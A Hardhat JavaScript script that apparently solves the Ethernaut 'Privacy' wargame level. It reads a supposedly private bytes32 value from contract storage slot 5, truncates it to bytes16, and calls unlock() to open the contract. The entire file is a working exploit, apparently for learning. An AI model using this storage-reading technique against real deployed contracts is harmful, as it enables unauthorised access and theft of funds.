// We require the Hardhat Runtime Environment explicitly here. This is optionall
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");

async function main() {
  // 👉 Contract name and address
  const contractName = "Privacy";
  const contractAddress = "0x333a77230bF16a960F74Bd7FE208F4057a10936C";

  // 📗 We get the contract to be hacked
  const contract = await hre.ethers.getContractAt(
    contractName,
    contractAddress
  );

  // 🔨 Get accounts
  let [hacker, _, tester] = await hre.ethers.getSigners();
  hacker = tester;
  console.log(`🤓 Hacker address:\n ${hacker.address} \n`);

  // 👿 Hacking the contract
  // 📖 https://docs.ethers.io/v5/api/providers/provider/
  let dataHackedByte32;

  let index = 5; // index where data[2] is stored
  dataHackedByte32 = await ethers.provider.getStorageAt(
    contract.address,
    index
  );

  // 🗣 Logging status
  console.log("🔑 Hacked password (byte32) - value: ", dataHackedByte32);
  console.log(
    "🔑 Hacked password (byte32) - length:",
    ethers.utils.hexDataLength(dataHackedByte32)
  );
  let locked = await contract.locked();
  console.log("🔑 Lock status before unlocking:", locked);

  // Unlock the contract
  let dataHackedByte16; // Option 1 - conversion coming from a contract function doing byte16(data[2])
  dataHackedByte16 = dataHackedByte32
    .toString()
    .substring(0, dataHackedByte32.toString().length / 2 + 1); // Option 2

  console.log("🔑 Hacked password (byte16) - value: ", dataHackedByte16);
  let unlockTx = await contract.connect(hacker).unlock(dataHackedByte16);
  await unlockTx.wait((confirms = 1));

  // 🗣 Logging status
  locked = await contract.locked();
  console.log("🔑 Lock status after unlocking:", locked);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
